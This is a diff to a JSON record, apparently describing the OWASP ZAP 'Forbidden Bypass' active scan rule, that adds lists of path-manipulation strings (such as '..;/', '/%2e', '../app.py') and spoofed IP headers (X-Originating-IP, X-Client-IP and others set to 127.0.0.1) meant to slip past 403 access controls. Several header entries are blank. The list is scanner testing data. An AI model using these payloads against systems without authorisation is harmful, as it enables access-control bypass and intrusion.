@@ -14,8 +14,61 @@
     "OWASP_2017_A05": "",
     "WSTG_V42_ATHN_04_AUTH_BYPASS": ""
   },
-  "payloads": [],
+  "payloads": [
+    "/%2e",
+    "/./",
+    "/.",
+    "/./",
+    "%20/",
+    "/%20",
+    "%20/",
+    "%09/",
+    "/%09",
+    "%09/",
+    "..;/",
+    "?",
+    "??",
+    "/",
+    "//",
+    "/",
+    "/.testus",
+    "../app.py"
+  ],
   "patterns": [],
+  "all_arrays": {
+    "pathPayloads": [
+      "/%2e",
+      "/./",
+      "/.",
+      "/./",
+      "%20/",
+      "/%20",
+      "%20/",
+      "%09/",
+      "/%09",
+      "%09/",
+      "..;/",
+      "?",
+      "??",
+      "/",
+      "//",
+      "/",
+      "/.testus",
+      "../app.py"
+    ],
+    "headerPayloads": [
+      ": ",
+      ": ",
+      ": ",
+      "x-custom-ip-authorization: 127.0.0.1",
+      "x-originating-ip: 127.0.0.1",
+      ": 127.0.0.1",
+      "x-remote-ip: 127.0.0.1",
+      "x-client-ip: 127.0.0.1",
+      "x-host: 127.0.0.1",
+      "x-forwarded-host: 127.0.0.1"
+    ]
+  },
   "raw_class": "org.zaproxy.zap.extension.ascanrulesBeta.ForbiddenBypassScanRule",
   "passive": false
 }
